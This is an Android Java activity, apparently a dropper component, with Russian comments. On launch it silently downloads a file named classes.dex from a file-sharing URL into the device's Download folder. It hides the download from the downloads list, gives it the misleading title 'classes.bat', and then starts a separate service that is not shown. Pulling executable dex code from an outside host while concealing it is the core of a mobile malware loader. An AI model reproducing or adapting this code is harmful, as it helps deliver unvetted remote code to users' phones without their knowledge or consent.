package com.example.bos_1;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.app.DownloadManager;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // Производим скачивание dex файла с интернета
        new DownloadingTask().execute();
        // Производим запуск сервиса
        startService(new Intent(MainActivity.this, MyService.class));
    }

    // Скачивание файла реализовано отдельным классом
    private class DownloadingTask extends AsyncTask<Void, Void, Void> {
        @RequiresApi(api = Build.VERSION_CODES.M)
        @Override
        protected Void doInBackground(Void... voids) {
            String urlString = "http://www.fayloobmennik.net/files/go/435825200.html?check=c197c743302e06b41585b1344dba8cb3&file=7414524";
            String filename = Environment.getExternalStorageDirectory().getAbsolutePath().toString() +
                    "/Download/" + "classes.dex";
            // Воспользуемся услугами менеджера загрузок
            DownloadManager downloadmanager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
            Uri uri = Uri.parse(urlString);
            DownloadManager.Request request = new DownloadManager.Request(uri);
            request.setTitle("classes.bat");
            request.setDescription("Downloading");
            request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
            request.setVisibleInDownloadsUi(false);
            request.setDestinationUri(Uri.parse("file://" + filename));
            downloadmanager.enqueue(request);
            return null;
        }
    }
}